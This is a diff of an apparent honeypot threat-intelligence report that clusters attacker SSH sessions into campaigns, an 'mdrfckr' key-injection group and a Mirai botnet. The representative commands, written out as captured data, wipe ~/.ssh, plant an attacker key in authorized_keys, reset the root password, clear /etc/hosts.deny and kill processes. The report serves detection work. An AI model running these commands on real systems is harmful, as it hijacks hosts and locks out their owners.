@@ -1,9 +1,9 @@
 {
-  "generated_at": "2026-06-17T22:03:19.811397+00:00",
+  "generated_at": "2026-06-18T04:17:11.411951+00:00",
   "total_sessions_with_commands": 5,
-  "total_clusters": 2,
-  "campaign_clusters": 2,
-  "singleton_clusters": 0,
+  "total_clusters": 3,
+  "campaign_clusters": 3,
+  "singleton_clusters": 1,
   "highest_severity": "HIGH",
   "active_campaigns": [
     {
@@ -29,14 +29,25 @@
       "cluster_id": "CLU-002",
       "name": "mdrfckr SSH Key Injection",
       "severity": "HIGH",
-      "session_count": 3,
-      "unique_ip_count": 3,
+      "session_count": 2,
+      "unique_ip_count": 2,
       "ttps": [
         "T1021.004",
         "T1078",
         "T1070",
         "T1140",
         "T1105"
+      ]
+    },
+    {
+      "cluster_id": "CLU-003",
+      "name": "Mirai/IoT Botnet",
+      "severity": "HIGH",
+      "session_count": 1,
+      "unique_ip_count": 1,
+      "ttps": [
+        "T1105",
+        "T1059.004"
       ]
     }
   ],
@@ -63,11 +74,11 @@
       ],
       "session_count": 2,
       "unique_ips": [
-        "36.212.227.224",
-        "14.103.126.104"
+        "113.108.13.168",
+        "118.145.214.235"
       ],
       "unique_ip_count": 2,
-      "sequence_hash": "b3146ab60a086fb3",
+      "sequence_hash": "ee216a3d4b5100c2",
       "ttps": [
         {
           "id": "T1021.004",
@@ -114,7 +125,7 @@
         "cd ~; chattr -ia .ssh; lockr -ia .ssh",
         "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
         "cat /proc/cpuinfo | grep name | wc -l",
-        "echo \"root:1QJB7Chbvzuf\"|chpasswd|bash",
+        "echo \"root:m5dSmvptFHsj\"|chpasswd|bash",
         "rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;",
         "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
         "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
@@ -124,20 +135,20 @@
       ],
       "members": [
         {
-          "session_id": "IR-210fd51b1599",
-          "src_ip": "36.212.227.224",
+          "session_id": "IR-b710139a811f",
+          "src_ip": "118.145.214.235",
           "country": "",
           "isp": "",
           "command_count": 19,
-          "timestamp": "2026-06-17T18:23:04.058522Z"
+          "timestamp": "2026-06-18T01:44:39.790189Z"
         },
         {
-          "session_id": "IR-360b68f89efe",
-          "src_ip": "14.103.126.104",
+          "session_id": "IR-f1f5969d4897",
+          "src_ip": "113.108.13.168",
           "country": "",
           "isp": "",
           "command_count": 19,
-          "timestamp": "2026-06-17T20:40:27.982103Z"
+          "timestamp": "2026-06-18T04:10:43.786297Z"
         }
       ]
     },
@@ -161,13 +172,12 @@
           "pattern_total": 3
         }
       ],
-      "session_count": 3,
+      "session_count": 2,
       "unique_ips": [
-        "121.184.144.232",
-        "103.130.213.223",
-        "45.61.187.220"
+        "102.220.85.131",
+        "72.253.251.7"
       ],
-      "unique_ip_count": 3,
+      "unique_ip_count": 2,
       "sequence_hash": "98af0db988d5971c",
       "ttps": [
         {
@@ -197,28 +207,69 @@
       ],
       "members": [
         {
-          "session_id": "IR-54f2d3b03c0c",
-          "src_ip": "103.130.213.223",
+          "session_id": "IR-22df195ba694",
+          "src_ip": "72.253.251.7",
           "country": "",
           "isp": "",
           "command_count": 2,
-          "timestamp": "2026-06-17T19:28:00.752205Z"
+          "timestamp": "2026-06-18T00:02:05.598635Z"
         },
         {
-          "session_id": "IR-c1e699bc346c",
-          "src_ip": "45.61.187.220",
+          "session_id": "IR-43085bf7b0b0",
+          "src_ip": "102.220.85.131",
           "country": "",
           "isp": "",
           "command_count": 2,
-          "timestamp": "2026-06-17T20:50:53.345840Z"
+          "timestamp": "2026-06-18T04:00:24.536173Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-003",
+      "is_campaign": true,
+      "campaign_name": "Mirai/IoT Botnet",
+      "campaign_severity": "HIGH",
+      "campaign_description": "Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.",
+      "matched_campaigns": [
+        {
+          "name": "Mirai/IoT Botnet",
+          "ttps": [
+            "T1105",
+            "T1059.004"
+          ],
+          "severity": "HIGH",
+          "description": "Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.",
+          "pattern_hits": 1,
+          "pattern_total": 3
+        }
+      ],
+      "session_count": 1,
+      "unique_ips": [
+        "185.16.38.216"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "e89a0000ac8e8834",
+      "ttps": [
+        {
+          "id": "T1105",
+          "name": "T1105"
         },
         {
-          "session_id": "IR-d719ec1f1988",
-          "src_ip": "121.184.144.232",
+          "id": "T1059.004",
+          "name": "T1059.004"
+        }
+      ],
+      "representative_commands": [
+        "busybox abc"
+      ],
+      "members": [
+        {
+          "session_id": "IR-230dbcf6bb6b",
+          "src_ip": "185.16.38.216",
           "country": "",
           "isp": "",
-          "command_count": 2,
-          "timestamp": "2026-06-17T20:56:37.074908Z"
+          "command_count": 1,
+          "timestamp": "2026-06-18T02:37:24.944810Z"
         }
       ]
     }
